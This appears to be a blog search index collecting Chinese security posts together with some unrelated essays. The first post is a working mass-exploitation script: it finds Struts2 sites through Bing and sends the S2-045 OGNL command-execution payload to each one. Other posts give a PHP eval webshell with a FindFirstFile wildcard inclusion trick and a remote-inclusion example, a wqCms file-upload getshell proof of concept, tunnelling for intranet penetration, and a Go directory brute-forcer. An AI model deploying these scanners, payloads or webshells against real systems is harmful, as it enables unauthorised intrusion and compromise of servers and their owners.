<?xml version="1.0" encoding="utf-8"?>
<search>
  
    
    <entry>
      <title><![CDATA[s2-045漏洞批量检测工具]]></title>
      <url>%2F2017%2F03%2F07%2Fst2-045-batch-Test-Tool.html</url>
      <content type="text"><![CDATA[今天晚上看老铁们在群里就这个st2-045漏洞讨论得火热，个人不太喜欢日站，本来想直接写个批量挂马的东西，但是想想还是算了，如果你有兴趣，改改也很容易，反正不关我的事 测试图 依赖包的安装12pip install requestspip install beautifulsoup 对于此脚本所放置文件夹下必须有keyword.txt用来存放一行行的关键词最开始是打算直接全部读取然后一个一个跑，不过感觉时间太漫长，测试时间太久后来改成关键词就是自己输入，但是又感觉太麻烦然后就变成了现在的读取关键词然后标号直接输入序号就可以途中遇到了有的网址直接拒绝访问导致报错，还有的超时一直不返回报文，这些都解决了，个人测试的结果还可以，结果保存在一个txt下，至于你想再干些什么，不关我的事情了 说明例子：1python s2-045.py 9 10 第一个参数是你的文件名，第二个是关键词所对应的序号，第三个是你需要爬行的页数序号与关键词的对应，可以直接运行python s2-045.py就可以产看帮助脚本采用的bing搜索引擎，文件我会打包在下面 上代码,python2和3通用 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172# encoding:utf-8import sys,requestsfrom bs4 import BeautifulSoupkeyword = &#123;&#125;with open("keyword.txt") as f: i = 0 for keywordLine in f: keyword[str(i)] = keywordLine i += 1usage = '''usage : python s2-045.py 0 10first parameter is your filenamesecond parameter is your keyword's number which will be used by BingThird parameter is the page number you want to crawl\n'''def poc(actionURL): data = '--447635f88b584ab6b8d9c17d04d79918\ Content-Disposition: form-data; name="image1"\ Content-Type: text/plain; charset=utf-8\ \ x\ --447635f88b584ab6b8d9c17d04d79918--' header = &#123; "Content-Length" : "155", "User-Agent" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36", "Content-Type" : "%&#123;(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;", &#125; try: request = requests.post(actionURL, data=data, headers=header, timeout = 10) except: return "Refused" return request.status_codedef returnURLList(): keywordsBaseURL = 'http://cn.bing.com/search?q=' +keyword[sys.argv[1]]+ '&amp;first=' n =0 i = 1 while n &lt; int(sys.argv[2]): baseURL = keywordsBaseURL + str(i) try: req = requests.get(baseURL) soup = BeautifulSoup(req.text, "html.parser") text = soup.select('li.b_algo &gt; h2 &gt; a') standardURL = [url['href'][:url['href'].index('action')]+'action' for url in text if 'action' in url['href']] except: print("HTTPERROR") continue i += 10 n += 1 yield standardURLdef main(): if len(sys.argv) != 3: print(usage) for k,v in keyword.items(): print("%s is %s"%(k, v)) sys.exit() for urlList in returnURLList(): for actionURL in urlList: code = poc(actionURL) print(str(code)+'----'+actionURL+'\n') if code == 200: with open("AvailableURL.txt","a") as f: f.write(actionURL+'\n')if __name__ == '__main__': main() 下载地址]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Windows FindFirstFile利用]]></title>
      <url>%2F2017%2F03%2F04%2FWindows-FindFirst-Exploit.html</url>
      <content type="text"><![CDATA[目前大多数程序都会对上传的文件名加入时间戳等字符再进行MD5，然后下载文件的时候通过保存在数据库里的文件ID读取文件路径，一样也实现了文件下载，这样我们就无法直接得到我们上传的webshell文件路径，但是当在Windows下时，我们只需要知道文件所在目录，然后利用Windows的特性就可以访问到文件，这是因为Windows在搜索文件的时候使用了FindFirstFile这一个winapi函数，该函数到一个文件夹(包含子文件夹)去搜索指定文件。 利用方法很简单，我们只要将文件名不可知部分之后的字符用”&lt;”或者”&gt;”代替即可，不过要注意一点是，只使用一个”&lt;”或者”&gt;”则只能代表一个字符，如果文件名是12345或者更长，这时候请求”1&lt;”或者”1&gt;”都是访问不到文件的，需要”1&lt;&lt;”才能访问到，代表继续往下搜索，有点像Windows的短文件名，这样我们还可以通过这个方式来爆破目录文件了。我们来做个简单的测试，测试代码如下：12345//1.php&lt;?php include($_GET['file']); ?&gt; 再在同目录下新建一个文件名为”123456.txt”的文件，内容为phpinfo()函数，请求/1.php?file=1&lt;&lt;即可包含。 常用的漏洞代码1 1234567&lt;?php if(isset($_GET[page])) &#123; include($_GET[page]); &#125;else&#123; include 'show.php'; &#125;?&gt; 21234567&lt;?php if(isset($_GET[page])) &#123; include('./action/' . $_GET[page]); &#125;else&#123; include './action/show.php'; &#125;?&gt; 31234567&lt;?php if(isset($_GET[page])) &#123; include('./action/'. $_GET[page] . '.php'); &#125;else&#123; include './action/show.php'; &#125;?&gt; 相关代码： php中代码： 123&lt;?php include($_GET['file']);?&gt; 123456.txt中代码： 1&lt;?php phpinfo() ?&gt; 123456.TXT里面可以换成一句话木马，代码： 1&lt;?php eval($_POST["admin"]) ?&gt; url:http://127.0.0.1/1.php?file=12&lt;&lt;密码：admin注意：txt里面书写php代码不能换行写，最好是在同一行书写【原因待查明】 windows的文件系统机制引发的PHP路径爆破问题分析开场白此次所披露的是以下网页中提出的问题所取得的测试结果： http://code.google.com/p/pasc2at/wiki/SimplifiedChinese1234567&lt;?php for ($i=0; $i&lt;255; $i++) &#123; $url = '1.ph' . chr($i); $tmp = @file_get_contents($url); if (!empty($tmp)) echo chr($i) . " "; &#125;?&gt; 已知1.php存在，以上脚本访问的结果是：12341.php1.phP1.ph&lt;1.ph&gt; 都能得到返回。前两种能返回结果是总所周知的（因为windows的文件系统支持大小的互转的机制），另外的两种返回引起了我们的注意。 测试php版本：PHP4.9,PHP5.2,PHP5.3,PHP6.0 测试系统：WINXP SP3 X32,WINXP SP2 X64，WIN7,WIN2K3 经测试我们得出的结论是：该漏洞影响所有的windows+php版本 深入探查模糊测试的结果为了继续深入探查关于该bug的信息，我们对demo做了些许修改:123456789&lt;?php for ($j=0; $i&lt;256; $j++) &#123; for ($i=0; $i&lt;256; $i++) &#123; $url = '1.p' . chr($j) . chr($i); $tmp = @file_get_contents($url); if (!empty($tmp)) echo chr($j) . chr($i) . " "; &#125; &#125;?&gt; 在调试php解释器的过程中，我们将此“神奇”的漏洞归结为一个Winapi 函数FindFirstFile(）所产生的结果(http://msdn.microsoft.com/en-us/library/aa364418(v=vs.85).aspx).aspx).更好玩的是，当跟踪函数调用栈的过程中我们发现字符”&gt;”被替换成”?”，字符”&lt;”被替换成”*”，而符号”（双引号）被替换成一个”.”字符。这在2007年msdn公开的文档中被提及：http://msdn.microsoft.com/en-us/library/community/history/aa364418%28v=vs.85%29.aspx?id=3 但是此bug至今未被任何windows旗下所发行的任何版本修复! 我们要阐明的是，该函数FindFirstFile()在php下的运用远远不至于file_get_contents().关于该bug可以利用的函数我们已经列了如下一表： 此外，我们还发现该利用也可以被运用到c++中，以下采用来自msdn的例子：12345678910111213141516171819202122#include &lt;windows.h&gt;#include &lt;tchar.h&gt;#include &lt;stdio.h&gt;void _tmain(int argc, TCHAR *argv[])&#123; WIN32_FIND_DATA FindFileData; HANDLE hFind; if( argc != 2 )&#123; _tprintf(TEXT("Usage: %s [target_file] "), argv[0]); return; &#125; _tprintf (TEXT("Target file is %s "), argv[1]); hFind = FindFirstFile(argv[1], &amp;FindFileData); if (hFind == INVALID_HANDLE_VALUE)&#123; printf ("FindFirstFile failed (%d) ", GetLastError()); return; &#125;else&#123; _tprintf (TEXT("The first file found is %s "), FindFileData.cFileName); FindClose(hFind); &#125;&#125; 当传入参数”c:o&lt;”时，成功访问到boot.ini文件。 利用方法总结 当调用FindFirstFile()函数时，”&lt;”被替换成” ”,这意味该规则可以使”&lt;”替换多个任意字符，但是测试中发现并不是所有情况都如我们所愿。所以，**为了确保能够使”&lt;”被替换成””,应当采用”&lt;&lt;”** 1EXAMPLE:include(‘shell&lt;&apos;); 或者include(‘shell&lt;&lt;&apos;); //当文件夹中超过一个以shell打头的文件时，该执行取按字母表排序后的第一个文件。 当调用FindFirstFile()函数时，”&gt;”被替换成”?”,这意味这”&gt;”可以替换单个任意字符 1EXAMPLE：include(‘shell.p&gt;p&apos;); //当文件中超过一个以shell.p?p 通配时，该执行取按字母表排序后的第一个文件。 当调用FindFirstFile()函数时，”””(双引号)被替换成”.” 1EXAMPLE:include(‘shell”php&apos;); //===&gt;include(‘shell.php&apos;); 如果文件名第一个字符是”.”的话，读取时可以忽略之 1EXAMPLE：fopen(‘.htacess&apos;); //==&gt;fopen(‘htacess&apos;); //加上第一点中的利用 ==&gt;fopen(‘h&lt;&lt;&apos;); 文件名末尾可以加上一系列的/或者的合集，你也可以在/或者中间加上.字符，只要确保最后一位为”.” 1EXAMPLE：fopen(“config.ini\.// ///.”);==&gt; fopen(‘config.ini./..&apos;); ==&gt;fopen(‘config.ini/////.&apos;)==&gt;fopen(‘config.ini…..&apos;) //译者注：此处的利用我不是很理解，有何作用？截断？ 该函数也可以调用以”\”打头的网络共享文件，当然这会耗费不短的时间。补充一点，如果共享名不存在时，该文件操作将会额外耗费4秒钟的时间，并可能触发时间响应机制以及max_execution_time抛错。所幸的是，该利用可以用来绕过allow_url_fopen=Off 并最终导致一个RFI（远程文件包含） 1EXAMPLE：include (‘\evilservershell.php&apos;); 用以下方法还可以切换文件的盘名 1include(‘\.C:myfile.php......D:anotherfile.php&apos;); 选择磁盘命名语法可以用来绕过斜线字符过滤 1file_get_contents(‘C:boot.ini&apos;); //==&gt; file_get_contents (‘C:/boot.ini&apos;); 在php的命令行环境下（php.exe）,关于系统保留名文件的利用细节 123EXAMPLE:file_get_contents(‘C:/tmp/con.jpg&apos;); //此举将会无休无止地从CON设备读取0字节，直到遇到eofEXAMPLE:file_put_contents(‘C:/tmp/con.jpg&apos;,chr(0×07)); //此举将会不断地使服务器发出类似哔哔的声音 更深入的利用方法除了以上已经展示的方法，你可以用下面的姿势来绕过WAF或者文件名过滤 请思考该例：1234&lt;?php file_get_contents("/images/".$_GET['a'].".jpg"); //or another function from Table 1, i.e. include().?&gt; 访问test.php?a=../a&lt;%00 可能出现两种结果 Warning: include(/images/../a&lt;) [function.include]: failed to open stream:Invalid argument in。。。 Warning: include(/images/../a&lt;) [function.include]: failed to open stream:Permission denied。。 如果是第一种情况，说明不存在a打头的文件，第二种则存在。 此外，有记录显示，有时网站会抛出如下错误：1Warning: include(/admin_h1d3) [function.include]: failed to open stream: Permission denied.. 这说明该文件夹下存在一个以上以a打头的文件（夹），并且第一个就是admin_h1d3。 结论实验告诉我们，php本身没有那么多的漏洞，我们所看到是：过分的依赖于另一种程序语言（注：如文中的漏洞产自与winapi的一个BUG），并且直接强 制使用，将会导致细微的错误(bug)，并最终造成危害(vul).这样便拓宽了模糊测试的范畴（译者注：并不仅仅去研究web层面，而深入到系统底层），并最终导致IDS，IPS的规则更新。诚然，代码需要保护，需要补丁，需要升级与扩充。但是，这并不是我们真正要去关注的问题。在当下，我认为我们 更谨慎地去书写更多更严厉的过滤规则，正如我们一直在做的一样。任重道远，精益求精。 因为这是基础应用层的问题，所以我们猜想类似的问题可能出现在其他web应用中。于是我们还测试了mysql5,而实验结果表明，mysql5并不存在类似的漏洞。但是我们仍认为：类似的漏洞将会出现在诸如Perl、Python、Ruby等解释性语言上。 Referer PHP application source code audits advanced technology: http://code.google.com/p/pasc2at/wiki/SimplifiedChinese MSDN FindFirstFile Function reference: http://msdn.microsoft.com/en-us/library/aa364418(v=vs.85).aspx MSDN comments history: http://msdn.microsoft.com/en-us/library/community/history/aa364418(v=vs.85).aspx?id=3 MSDN article «Naming Files, Paths, and Namespaces»: http://msdn.microsoft.com/en-us/library/aa365247(v=vs.85).aspx Technet article «Managing Files and Directories»: http://technet.microsoft.com/en-us/library/cc722482.aspx Paper «Technique of quick exploitation of 2blind SQL Injection»: http://www.exploit-db.com/papers/13696/ 全文完。 注：该文是2011年底发表的一篇白皮书，至今该bug依然存在。我在几个月前做CUIT的一个CTF时偶遇了一道该bug的利用，当时便是看的此文，当时只是粗粗读了一下，写了一个php的脚本去跑目录。今回闲来无事，翻译整理了一番。 文章转自群友 版权声明：文章所设计内容包括两部分一是法师的书籍《代码审计-企业级web代码安全架构》二是来自群友@evil7提供的资料以下为资料原文：http://www.169it.com/blog_article/2302639890.htmlhttps://code.google.com/archive/p/pasc2at/wikis/SimplifiedChinese.wiki]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[wqCms6.0在IIS6的Getshell]]></title>
      <url>%2F2017%2F02%2F22%2FwqCms6.0%E5%9C%A8IIS6%E7%9A%84Getshell.html</url>
      <content type="text"><![CDATA[2017-02-15发布 一、漏洞利用点漏洞文件:admin_UploadDataHandler.ashx 自定义构造上传点 二、hack it 三、POC123456789&lt;html&gt; &lt;body&gt; &lt;form action="http://127.0.0.1/admin_UploadDataHandler.ashx" method="POST"enctype="multipart/form-data"&gt; &lt;input type="file" name="uploadify" /&gt; &lt;input type="text" name="saveFile" value="admin" /&gt; &lt;input type="submit" name="Upload" value="Submit Query" /&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 转自群友论坛文章wobushou]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[otunnel：一个和lcx差不多的端口转发的工具]]></title>
      <url>%2F2017%2F02%2F15%2Fotunnel%EF%BC%9A%E4%B8%80%E4%B8%AA%E5%92%8Clcx%E5%B7%AE%E4%B8%8D%E5%A4%9A%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E7%9A%84%E5%B7%A5%E5%85%B7.html</url>
      <content type="text"><![CDATA[这是一个采用Golang编写的和lcx差不多的端口转发的工具，用来突破内网环境 项目地址ooclab/otunnel 下载地址(内涵各大平台)http://dl.ooclab.com/otunnel/ otunnel 用法前提： 假设 server 的地址为 example.com 从 client 能连接 server (client 与 server 无需在同一个网络) 注意 otunnel 程序可以作为 server 和 client 两种角色（运行参数不同） 快速上手server1./otunnel listen :10000 -s longlongsecret client反向代理举例：将 client 可以访问的 192.168.1.3:22 映射到 server 上的 10022 端口：1./otunnel connect example.com:10000 -s longlongsecret -t 'r:192.168.1.3:22::10022' 现在访问 example.com:10022 即等于访问了 client 内网的 192.168.1.3:22 正向代理举例：假设 example.com 的 127.0.0.1:3128 服务（你懂得），在 client 运行：1./otunnel connect example.com:10000 -s longlonglongsecret -t 'f::20080:127.0.0.1:3128' 现在 client 的 20080 端口， 等于访问 example.com 上的 127.0.0.1:3128 程序用法-t 格式包含多个字段信息，以:隔开(为空的字段也不能省略:)。 1代理类型:本地地址:本地端口:远程地址:远程端口 字段 含义 代理类型 r 表示反向代理; f 表示正向代理 本地地址 IP或域名 本地端口 整数 远程地址 IP或域名 远程端口 整数 注意 本地地址或远程地址如果为空，表示所有网口 otunnel 命令行可以包含多个-t选项，同时指定多条隧道规则 特点及优势otunnel 是一款对称的安全隧道工具。 单二进制程序：otunnel 为一个独立的二进制程序，可以作为 server 和 client 端。 支持多操作系统平台：支持GNU/Linux, Unix-like, Mac, Windows，其他如 ddwrt 等 arm 平台。 无需配置文件：命令行使用 对称设计：同时支持 正、反向代理（端口映射） 安全加密：支持 AES 对称加密]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Golang初练手-多线程网站路径爆破]]></title>
      <url>%2F2017%2F02%2F08%2Ffirst-practice-for-Golang-Multithread-Website-Burster.html</url>
      <content type="text"><![CDATA[以前用Python写过这个工具，前两天看了golang的基础，就想着用这个语言把这个工具重写一遍 先放张图 用法123456Example : Buster.exe -u=https://www.baidu.com -d=asp.txt -t=5Buster是你的程序名字-u后面填网址参数，格式如上-d选字典-t是线程数当你第一次运行请直接在命令行运行你的程序，什么参数都别加，他会有提示信息告诉你怎么做的 话不多说，直接上代码，字典采用的以前搜集的一个珍藏的大字典，跑起来可能耗时比较久，文件外链会放在底下123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134package mainimport ( "bufio" "flag" "fmt" "io/ioutil" "net/http" "os" "sync")var urls chan stringvar no404URL = make(chan string)var wg sync.WaitGroup //等待goroutine完成func main() &#123; var baseURL string var dicPath string var threadCount int flag.StringVar(&amp;baseURL, "u", "https://www.baidu.com", "website which you want to burst") flag.StringVar(&amp;dicPath, "d", "asp.txt", "dic which you want to use") flag.IntVar(&amp;threadCount, "t", 5, "number of Thread") flag.Parse() if len(os.Args) == 1 &#123; fmt.Println("------------------------------------") fmt.Println(" Author | Akkuamn") fmt.Println("------------------------------------") fmt.Println(" Update-v1.0 | 2017-02-07") fmt.Println("-------------------------------------") fmt.Printf("\nUsage : \n\tExample : %s -u=https://www.baidu.com -d=asp.txt -t=5\n\n", os.Args[0]) fmt.Printf("View more help via %s -h\n\n", os.Args[0]) listDic("dic") &#125; else &#123; dicPath = "./dic/" + dicPath start(baseURL, dicPath, threadCount) wg.Wait() //等待goroutine完成 &#125;&#125;func start(baseURL string, dicPath string, threadCount int) &#123; dicFile, dicError := os.OpenFile(dicPath, os.O_RDONLY, 0) if dicError != nil &#123; fmt.Printf("\nOpenFile Error:文件打开出错，请检查字典文件是否存在，或文件名是否准确\n") return &#125; defer dicFile.Close() //把处理后的需要爆破的url全部传到信道urls ReturnBurstURL(dicFile, baseURL) //单独开goroutine从信道no404URL取数据写入文件 go func() &#123; resultTxt, err := os.OpenFile("result.txt", os.O_CREATE|os.O_TRUNC|os.O_RDWR, 0660) if err != nil &#123; fmt.Println("OpenFile Error:" + err.Error()) &#125; resultWriter := bufio.NewWriter(resultTxt) defer resultTxt.Close() for &#123; _, err = resultWriter.WriteString(&lt;-no404URL) if err != nil &#123; fmt.Println("resultWriter Error:" + err.Error()) &#125; resultWriter.Flush() &#125; &#125;() //并发访问网址并将状态码不为404的网址加入信道no404URL for i := 0; i &lt; threadCount; i++ &#123; wg.Add(1) go func(i int) &#123; for len(urls) &gt; 0 &#123; url := &lt;-urls status := HTTPStatus(url) fmt.Printf("[%d]%s-----%s\n", i, status, url) if status != "404 Not Found" &#123; no404URL &lt;- status + "-----" + url + "\n" &#125; &#125; wg.Done() &#125;(i) &#125;&#125;//返回HTTP访问状态码func HTTPStatus(url string) (status string) &#123; client := http.DefaultClient reqest, err := http.NewRequest("HEAD", url, nil) if err == nil &#123; reqest.Header.Set("User-Agent", "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:51.0) Gecko/20100101 Firefox/51.0") reqest.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8") response, err1 := client.Do(reqest) if err1 != nil &#123; fmt.Println("HTTPRequest Error:" + err1.Error()) &#125; defer response.Body.Close() return response.Status &#125; else &#123; fmt.Println("NewRequest Error:" + err.Error()) return "400 Bad Request" &#125;&#125;//把处理后的需要爆破的url全部传到信道urlsfunc ReturnBurstURL(fURL *os.File, baseurl string) &#123; var urlList []string allURLTxt := bufio.NewScanner(fURL) for allURLTxt.Scan() &#123; newurl := baseurl + "/" + allURLTxt.Text() urlList = append(urlList, newurl) &#125; urls = make(chan string, len(urlList)) for _, url := range urlList &#123; urls &lt;- url &#125; fmt.Printf("\n读取字典完成，准备开始，请等待...\n")&#125;//罗列出可用字典func listDic(dicDir string) &#123; dirList, err := ioutil.ReadDir(dicDir) if err != nil &#123; fmt.Println("ReadDir Error : " + err.Error() + "\n") &#125; fmt.Println("Dic you can select : ") for _, file := range dirList &#123; fmt.Printf(" %s\n", file.Name()) &#125;&#125; 只编译了win平台下的，如果有需要可以自行编译 源码及字典及win程序密码: g1gd]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Golang踩坑录 两种方式来读取文件一行所导致的问题]]></title>
      <url>%2F2017%2F02%2F04%2FGolang%E8%B8%A9%E5%9D%91%E5%BD%95-%E4%B8%A4%E7%A7%8D%E6%96%B9%E5%BC%8F%E6%9D%A5%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E4%B8%80%E8%A1%8C%E6%89%80%E5%AF%BC%E8%87%B4%E7%9A%84%E9%97%AE%E9%A2%98.html</url>
      <content type="text"><![CDATA[前两天零零碎碎看完了golang的基础，想着找个小项目练练手，可是出现了一个十分棘手的问题我要做的东西是网站路径爆破所以我会从文本字典中把一行行路径读取然后与域名拼接，但是我在跑起程序后出现了问题 下面是一个小片段123400 Bad Request-----http://www.xxx.com/channel.asp400 Bad Request-----http://www.xxx.com/index.asp404 Not Found-----http://www.xxx.com/admin.asp 程序本身并没有错误，但是运行结果就比较怪了Bad Request?这并不是我要说的重点，我发现的问题是，除了最后一个地址，前面所有的地址都会显示位400 Bad Request经过几轮测试，我觉得应该是网址拼接上出了问题 我的拼接函数是这样123456789101112func ReturnBurstURL(fURL *os.File, baseurl string) (urlList []string) &#123; allURLTxt := bufio.NewReader(fURL) for &#123; urlpath, readerError := allURLTxt.ReadString('\n') newurl := baseurl + strings.Replace(urlpath, "\n", "", -1) urlList = append(urlList, newurl) if readerError == io.EOF &#123; fmt.Printf("\n读取字典完成，准备开始，请等待...\n") return urlList &#125; &#125;&#125; 我把取一行的方式换成bufio.NewScanner就正常了123456789func ReturnBurstURL(fURL *os.File, baseurl string) (urlList []string) &#123; allURLTxt := bufio.NewScanner(fURL) for allURLTxt.Scan() &#123; newurl := baseurl + allURLTxt.Text() urlList = append(urlList, newurl) &#125; fmt.Printf("\n读取字典完成，准备开始，请等待...\n") return urlList&#125; 网上读取文件一行很多人写的文章是第一种方法，但是我也不知道什么问题导致这种情况的发生我特地去查了查api文档12345678910func NewReader(rd io.Reader) *Reader//NewReader returns a new Reader whose buffer has the default size. func (b *Reader) ReadString(delim byte) (string, error)//ReadString reads until the first occurrence of delim in the input, returning a string containing the data up to and including the delimiter. If ReadString encounters an error before finding a delimiter, it returns the data read before the error and the error itself (often io.EOF). ReadString returns err != nil if and only if the returned data does not end in delim. For simple uses, a Scanner may be more convenient. func NewScanner(r io.Reader) *Scanner//NewScanner returns a new Scanner to read from r. The split function defaults to ScanLines. func (s *Scanner) Scan() bool//Scan advances the Scanner to the next token, which will then be available through the Bytes or Text method. It returns false when the scan stops, either by reaching the end of the input or an error. After Scan returns false, the Err method will return any error that occurred during scanning, except that if it was io.EOF, Err will return nil. Scan panics if the split function returns 100 empty tokens without advancing the input. This is a common error mode for scanners. func (s *Scanner) Text() string//Text returns the most recent token generated by a call to Scan as a newly allocated string holding its bytes. 按照上面的api文档，这两个的区别就是两者在返回string的时候，一个是数据+分隔符，一个是一行的数据，不带分隔符虽说我第一种方法也用strings.Replace方法把”\n”替换成了””空字符，但是可能还是有点奇奇怪怪的东西 转载请注明出处]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[笔记带给我们是真实的知识增长么？你需要好好考虑了]]></title>
      <url>%2F2017%2F01%2F21%2F%E7%AC%94%E8%AE%B0%E5%B8%A6%E7%BB%99%E6%88%91%E4%BB%AC%E6%98%AF%E7%9C%9F%E5%AE%9E%E7%9A%84%E7%9F%A5%E8%AF%86%E5%A2%9E%E9%95%BF%E4%B9%88%EF%BC%9F%E4%BD%A0%E9%9C%80%E8%A6%81%E5%A5%BD%E5%A5%BD%E8%80%83%E8%99%91%E4%BA%86.html</url>
      <content type="text"><![CDATA[我有段时间疯狂使用各类笔记软件，相信什么云记忆，第二大脑之类的说法。后来发现，没啥意义。记多了根本看不完，你在当时没时间看的，过后更没时间看。笔记唯一剩下的作用就是检索，但是你没看过的内容，你又怎么知道要检索啥呢？而且，自己维护的资料库，怎么也没办法跟google的检索比。善用google的搜索规则，比浪费时间剪藏保存一大堆网页有效得多。其实滥用或者过分依赖这些笔记软件，最大的坏处是产生了知识增长的错觉。剪藏一篇机器学习的长文，就以为自己的知识增长了，其实只扫了一眼前言。 下载了一系列新框架的开发教程，三分钟热度把开发环境搭建完，跟着第一章跑了个hello world就弃坑了，但还是在欺骗自己，觉得自己已经掌握了，最不济那些教程已经被我收到硬盘里了，要用的时候再翻出来学嘛。而且，这种廉价的获得知识的错觉，带来的成就感比真的花时间去学习还要强，甚至会形成“要开工了-&gt;先了解下业界动态，去各大论坛微博逛一圈-&gt;哇，又有这么多新教程/技巧/开源库，看不过来，先保存到笔记软件 -&gt; 啊，不知不觉居然花了一个小时，不过我又不是打游戏看电影，是在收集知识，对自己还是有帮助的，不算虚度时光吧 -&gt; 继续开工，嗯？这个问题好像看到过更好的解决办法，要不要试着优化下？算了算了，反正办法在笔记里存着，以后有时间再重构吧 -&gt;…” 那几个月里我一直就陷在这样的循环里，同时还沾沾自喜于自己的“努力”而不自觉。直到某天，有个面试者坐到我面前时，我惊讶于他面谈时对各类业界动态新框架新技术口若悬河，但是实际的笔试题目却做得惨不忍睹，有些基础概念题都直接留白。我试探性地问了下原因，结果他特别诚恳地看着我说，这些问题的答案都存在他包里的笔记本电脑里，只要他想，分分钟就能搜出来。 当时我下意识地反问了一句：“那谁不会啊？” 说完我自己都惊了一下。 那天之后，我很少再去碰那些笔记软件了。第二大脑什么的都是骗人的，在我得老年痴呆之前，应该不会特别依赖它们。曾经我一个月要从各大技术论坛微博twitter上收集几十篇教程，上百篇技术长文，真正看完的，不到五篇。之后我发现，把产生这些知识的源头掐掉，统统加到127.0.0.1里去，节省下的时间认认真真读几本经典纸质书，跟着官方文档走一遍教程，不收集，多动手多思考，技术长进比之前快得多。实际做项目的时候碰到解决不了的问题怎么办？直接开google去搜呗。根本没必要去浪费时间维护一个私人的知识库。 在人类数千年漫长的文明史中，收藏本来是一件相当奢侈，大量耗费金钱、时间、精力的事情。但到了互联网的时代，这一切被简化成了点点鼠标就能完成的美事。或许因为盗版盛行的原因，它几乎已经是免费的，但它对于个体时间精力的耗费，却始终没有变化。而且，躺在硬盘里的资源们，就像王阳明的花一样，你未看它时，它与你同归于寂，一点关系都没有。 《银河英雄传说》里杨威利说过一句名言：“如果你不记得了，那说明它不重要。” 或许可以再补充一句，“如果你看不完，那就没必要看完。” 大概就是这样，不知不觉写了这么多，与所有现在或曾经的互联网资源收集成瘾症患者共勉。 转自V2EX一位v友的回答]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[PKM（个人知识管理）类软件收集(偶尔更新列表)]]></title>
      <url>%2F2017%2F01%2F21%2FPKM%EF%BC%88%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E7%AE%A1%E7%90%86%EF%BC%89%E7%B1%BB%E8%BD%AF%E4%BB%B6-%E5%81%B6%E5%B0%94%E6%9B%B4%E6%96%B0%E5%88%97%E8%A1%A8.html</url>
      <content type="text"><![CDATA[evernote(印象笔记) Wiz有道云 麦库 leanote GoogleKeep OneNote SimpleNote(wp家的，免费) pocket(稍后读的软件，同类的还有Instapaper，国内的收趣) MyBase RaysNote(v友开发) CintaNotes https://jitaku.io 开源 Gitit-Bigger Laverna paperwork DokuWiki leanote PermaNote CherryTree BrainStorm]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[web高级开发的成长之路]]></title>
      <url>%2F2017%2F01%2F20%2Fweb%E9%AB%98%E7%BA%A7%E5%BC%80%E5%8F%91%E7%9A%84%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF.html</url>
      <content type="text"><![CDATA[读了这篇文章之后感觉蛮受启发的，在此分享一下，献给和我一样处于困惑的朋友。 正文如下：本人也是coding很多年，虽然很失败，但也总算有点失败的心得，不过我在中国，大多数程序员都是像我一样，在一直走着弯路。如果想成为一个架构师，就必须走正确的路，否则离目标越来越远，正在辛苦工作的程序员们，你们有没有下面几种感觉？ 一、我的工作就是按时完成领导交给我的任务，至于代码写的怎样，知道有改进空间，但没时间去改进，关键是领导也不给时间啊。 二、我发现我的水平总是跟不上技术的进步，有太多想学的东西要学，jQuery用的人最近比较多啊，听说最近MVC比较火，还有LINQ，听说微软又有Silverlight了…… 三、我发现虽然我工作几年了，除了不停的coding，Ctrl+C和Ctrl+V更熟练了，但编码水平并没有提高，还是一个普通程序员，但有人已经做到架构师了。 四、工作好几年了，想跳槽换个工作，结果面试的考官都问了一些什么数据结构，什么垃圾回收，什么设计模式之类的东西，虽然看过，但是平时用不着，看了也忘记了，回答不上来，结果考官说我基础太差。。。 有没有，如果没有，接下来就不用看了，你一定是大拿了，或者已经明白其中之道了，呵呵。 如果有，恭喜你，你进入学习误区了，如果想在技术上前进的话，就不能一直的coding，为了完成需求而工作，必须在coding的同时，让我们的思维，水平也在不停的提高。 写代码要经历下面几个阶段。 一 、你必须学习面向对象的基础知识，如果连这个都忘了，那你的编程之路注定是在做原始初级的重复！ 很多程序员都知道类、方法、抽象类、接口等概念，但是为什么要面向对象，好处在哪里，要解决什么问题？只是明白概念，就是表达不清楚，然后在实 际工作中也用不上，过了一段时间，面向对象的东西又模糊了，结果是大多数程序员用着面向对象的语言做着面向过程的工作，因此要学习面向对象，首先应该明白 面向对象的目的是什么？ 面向对象的目的是什么？ 开发语言在不断发展，从机器语言，到汇编，到高级语言，再到第四代语言;软件开发方法在不断发展，从面向过程，面向对象，到面向方面等。虽然这些都在不断发展，但其所追求的目标却一直没变，这些目标就是： 1. 降低软件开发的复杂度 2. 